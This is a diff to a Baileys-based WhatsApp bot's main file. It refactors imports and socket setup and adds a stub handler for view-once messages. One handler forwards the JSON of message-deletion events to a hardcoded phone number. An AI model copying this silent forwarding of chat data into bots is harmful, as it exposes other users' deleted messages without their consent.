@@ -15,12 +15,11 @@ const {
 const { Boom } = boom;
 const {
   default: makeWaSocket,
-  // useSingleFileAuthState,
   useMultiFileAuthState,
   DisconnectReason,
+  jidNormalizedUser,
   fetchLatestBaileysVersion,
   generateForwardMessageContent,
-  generateWAMessage,
   prepareWAMessageMedia,
   generateWAMessageFromContent,
   generateMessageID,
@@ -28,7 +27,8 @@ const {
   makeInMemoryStore,
   jidDecode,
   proto,
-} = baileys;
+  delay,
+} = require('@adiwajshing/baileys');
 const { color, bgcolor } = require('./lib/color');
 const colors = require('colors');
 const { uncache, nocache } = require('./lib/loader');
@@ -76,19 +76,22 @@ nocache('../index.js', (module) =>
 );
 
 //// =_=_=_=_=_=_=_=_=_=_=_FUNCTION MENJALANKAN KONEKSI=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_= //
-async function dasBot() {
-  const { state, saveCreds } = await useMultiFileAuthState(
-    path.join(`./session`)
-    // path.join(__dirname, `./session`),
-    // log({ level: 'silent' })
-  );
+const dasBot = async () => {
+  const { state, saveCreds } = await useMultiFileAuthState(`./session`);
   const { version, isLatest } = await fetchLatestBaileysVersion();
   const das = makeWaSocket({
+    version,
     logger: pino({ level: 'silent' }),
     printQRInTerminal: true,
-    browser: ['DAS Bot WhatsApp (2023)', 'Safari', '1.0.0'],
+    browser: ['DASBOT Multi Device', 'Safari', '1.0.0'],
     auth: state,
-    version,
+  });
+
+  das.ev.on('message.delete', async (anu) => {
+    console.log('ANTI DELETE');
+    das.sendMessage('6285216024226@s.whatsapp.net', {
+      text: JSON.stringify(anu, null, 2),
+    });
   });
 
   store.bind(das.ev);
@@ -146,12 +149,6 @@ await das.updateBlockStatus(callerId, "block")
 }
 
  */
-  });
-
-  das.ev.on('messages.delete', async (anu) => {
-    das.sendMessage('6285216024226@s.whatsapp.net', {
-      text: JSON.stringify(anu, null, 2),
-    });
   });
 
   das.ev.on('messages.upsert', async (chatUpdate) => {
@@ -258,6 +255,12 @@ participant: `0@s.whatsapp.net`,
     // } catch (err) {
     // console.log(err)
     // }
+  });
+
+  das.ev.on('viewOnceMessage', async (anu) => {
+    console.log('once message');
+    // const { oneTime } = require('./lib/welcome');
+    // oneTime(setting, haruka, anu);
   });
 
   das.decodeJid = (jid) => {
@@ -634,7 +637,7 @@ END:VCARD`,
         dasBot();
       } else das.end(`Unknown DisconnectReason: ${reason}|${connection}`);
     }
-    console.log('Connected...', update);
+    // console.log('Connected...', update);
   });
 
   start('2', colors.bold.white('\nMenunggu Pesan Baru..'));
@@ -735,7 +738,7 @@ END:VCARD`,
   };
 
   return das;
-}
+};
 
 dasBot();
 
